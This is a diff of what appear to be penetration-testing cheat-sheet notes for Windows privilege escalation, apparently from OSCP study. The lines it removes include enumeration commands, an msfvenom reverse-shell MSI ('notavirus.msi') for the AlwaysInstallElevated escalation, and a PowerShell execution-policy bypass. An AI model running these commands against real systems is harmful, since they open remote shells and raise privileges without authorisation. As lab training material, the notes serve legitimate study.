@@ -739,34 +739,14 @@ root2:{HASH}:0:0:root:/root:/bin/bash
 
 
 
-### System
-
-```jsx
-
-
-ipconfig
-Get-ADdomain
-netstat -a
-
-```
 
 
 
-### Enumeration Files | Services | Tasks
 
 
 
-```
 
 
-
-```jsx
-schtasks /query /fo LIST /v | Select-String -Pattern "TaskName:"
-schtasks /query /fo LIST /v | Select-String -Pattern "Task To Run:"
-
-schtasks /query /fo LIST /v /tn \Microsoft\CacheCleanup
-icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
-```
 
 ### Git
 
@@ -798,12 +778,7 @@ shutdown /r /t 0
 
 ### AlwaysInstallElevated
 
-```jsx
-reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
-reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.154 LPORT=445 -f msi > notavirus.msi
-msiexec /i notavirus.msi
-```
+
 
 ### WinPEASx64.exe
 
@@ -882,23 +857,10 @@ runas /user:oscp\bernie cmd.exe
 # With RDP we can run as administrator (cmd) and type cleartext creds of other admin user
 ```
 
-### Check if service 32/64 bit
-
-It is important so the payload will be correct arch. Use this powershell script:
 
 
 
 
-### Got shitty cmd shell?
-
-```jsx
-set PATH=%SystemRoot%\system32;%SystemRoot%;
-%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe
-```
-
-```jsx
-%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass .\exploit.ps1
-```
 
 ### Cross-Compile
 
